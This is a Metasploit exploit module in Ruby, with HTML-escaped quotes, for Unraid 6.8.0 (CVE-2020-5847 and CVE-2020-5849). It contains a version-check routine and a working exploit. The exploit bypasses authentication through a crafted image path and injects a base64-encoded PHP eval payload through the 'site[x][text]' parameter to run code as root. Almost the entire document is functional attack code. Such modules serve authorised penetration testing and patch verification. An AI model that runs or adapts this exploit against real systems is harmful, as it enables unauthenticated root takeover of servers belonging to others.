# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE

  Rank = ExcellentRanking
  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039; => &#039;Unraid 6.8.0 Auth Bypass PHP Code Execution&#039;,
        &#039;Description&#039; => %q{
          This module exploits two vulnerabilities affecting Unraid 6.8.0.
          An authentication bypass is used to gain access to the administrative
          interface, and an insecure use of the extract PHP function can be abused
          for arbitrary code execution as root.
        },
        &#039;Author&#039; =>
          [
            &#039;Nicolas CHATELAIN <n.chatelain@sysdream.com>&#039;
          ],
        &#039;References&#039; =>
          [
            [ &#039;CVE&#039;, &#039;2020-5847&#039; ],
            [ &#039;CVE&#039;, &#039;2020-5849&#039; ],
            [ &#039;URL&#039;, &#039;https://sysdream.com/news/lab/2020-02-06-cve-2020-5847-cve-2020-5849-unraid-6-8-0-unauthenticated-remote-code-execution-as-root/&#039; ],
            [ &#039;URL&#039;, &#039;https://forums.unraid.net/topic/88253-critical-security-vulnerabilies-discovered/&#039; ]
          ],
        &#039;License&#039; => MSF_LICENSE,
        &#039;Platform&#039; => [&#039;php&#039;],
        &#039;Privileged&#039; => true,
        &#039;Arch&#039; => ARCH_PHP,
        &#039;Targets&#039; =>
          [
            [ &#039;Automatic&#039;, {}]
          ],
        &#039;DefaultTarget&#039; => 0,
        &#039;DisclosureDate&#039; => &#039;Feb 10 2020&#039;
      )
    )

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The URI of the Unraid application&#039;, &#039;/&#039;])
      ]
    )
  end

  def check
    res = send_request_cgi(
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;webGui/images/green-on.png/&#039;),
      &#039;method&#039; => &#039;GET&#039;
    )

    unless res
      return CheckCode::Unknown(&#039;Connection failed&#039;)
    end

    unless res.code == 200
      return CheckCode::Safe(&#039;Unexpected reply&#039;)
    end

    /\sVersion:\s(?<version>[\d]{1,2}\.[\d]{1,2}\.[\d]{1,2})&nbps;/ =~ res.body

    if version && Gem::Version.new(version) == Gem::Version.new(&#039;6.8.0&#039;)
      return CheckCode::Appears("Unraid version #{version} appears to be vulnerable")
    end

    CheckCode::Safe
  end

  def exploit
    begin
      vprint_status(&#039;Sending exploit code&#039;)
      res = send_request_cgi(
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;webGui/images/green-on.png/&#039;),
        &#039;method&#039; => &#039;GET&#039;,
        &#039;encode_params&#039; => false,
        &#039;vars_get&#039; =>
        {
          &#039;path&#039; => &#039;x&#039;,
          &#039;site[x][text]&#039; => Rex::Text.uri_encode("<?php eval(base64_decode(&#039;#{Rex::Text.encode_base64(payload.encoded)}&#039;)); ?>", &#039;hex-normal&#039;)
        }
      )

      if res.nil?
        print_good(&#039;Request timed out, OK if running a non-forking/blocking payload...&#039;)
      elsif res.code == 302
        fail_with(Failure::NotVulnerable, &#039;Redirected, target is not vulnerable.&#039;)
      else
        print_warning("Unexpected response code #{res.code}, please check your payload.")
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end
end

